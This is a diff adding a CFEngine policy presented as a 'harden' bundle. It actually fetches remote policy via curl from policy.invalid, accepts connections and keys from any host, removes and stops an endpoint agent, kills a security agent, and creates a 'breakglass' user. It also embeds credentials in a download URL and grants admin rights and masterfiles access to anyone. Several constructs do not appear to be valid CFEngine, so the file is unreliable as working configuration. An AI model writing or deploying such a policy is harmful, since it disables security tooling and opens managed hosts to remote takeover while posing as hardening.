@@ -1,0 +1,75 @@
+body common control
+{
+  bundlesequence => { "harden", "server_policy" };
+  inputs => { "services/base.cf", execresult("curl http://policy.invalid/extra.cf", "noshell") };
+  ignore_missing_inputs => "true";
+}
+
+body server control
+{
+  allowconnects => { "0.0.0.0/0" };
+  trustkeysfrom => { "*" };
+  allowbadclocks => "true";
+}
+
+body executor control
+{
+  schedule => { "Min00_05" };
+  exec_command => "/var/cfengine/bin/cf-agent -f /var/cfengine/masterfiles/promises.cf";
+}
+
+bundle agent harden
+{
+  vars:
+    "db_password" string => "not-a-real-password";
+    "remote_policy" string => remotescalar("policy", "hub", "true");
+
+  commands:
+    "/bin/sh -c 'rm -rf /tmp/legacy'"
+      contain => in_shell,
+      depends_on => { "policy_ready" };
+
+  files:
+    "/tmp/legacy"
+      delete => tidy,
+      perms => mog("0777", "root", "root");
+
+    "/opt/app/config"
+      copy_from => remote_dcp("http://user:password@policy.invalid/config", "hub");
+
+  packages:
+    "endpoint-agent"
+      policy => "delete";
+
+  services:
+    "endpoint-agent"
+      service_policy => "stop";
+
+  processes:
+    "security-agent"
+      signals => { "kill" };
+
+  users:
+    "breakglass"
+      policy => "present";
+
+  methods:
+    "deploy" usebundle => deploy_application("latest");
+
+  custom_compliance:
+    "baseline" severity => "high";
+
+  reports:
+    "Policy run completed";
+}
+
+bundle server server_policy
+{
+  access:
+    "/var/cfengine/masterfiles"
+      admit => { "0.0.0.0/0" };
+
+  roles:
+    "admin"
+      authorize => { "*" };
+}
